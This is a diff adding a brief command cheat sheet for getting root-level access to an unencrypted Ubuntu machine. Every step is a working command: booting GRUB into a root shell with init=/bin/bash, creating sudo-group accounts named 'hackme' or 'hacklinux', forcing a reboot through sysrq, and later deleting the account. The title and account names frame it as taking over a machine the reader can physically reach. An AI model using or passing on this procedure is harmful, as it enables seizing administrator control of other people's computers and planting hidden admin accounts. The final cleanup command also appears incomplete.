@@ -1,0 +1,26 @@
+# Getting a sudo user when you have access to an unencrypted ubuntu machine
+Boot into grub and press 'e'
+linux line (almost last) add init=/bin/bash
+ctrl-x
+mount -o remount,rw /
+## if home in other folder:
+fdisk -l
+# mkdir /media/home -p
+# mount /dev/sda3 /media/home
+mount /dev/sda3 /home
+adduser hackme --home /media/home/hackme
+# enter info
+usermod -aG sudo hackme
+
+## OR:
+useradd hacklinux -m -G sudo -s /bin/bash
+# -d /media/home/hacklinux
+passwd hacklinux
+
+## shutdown:
+echo 1 > /proc/sys/kernel/sysrq
+echo b > /proc/sysrq-trigger
+
+## remove user:
+deluser hacklinux
+rm /home/hacklinux
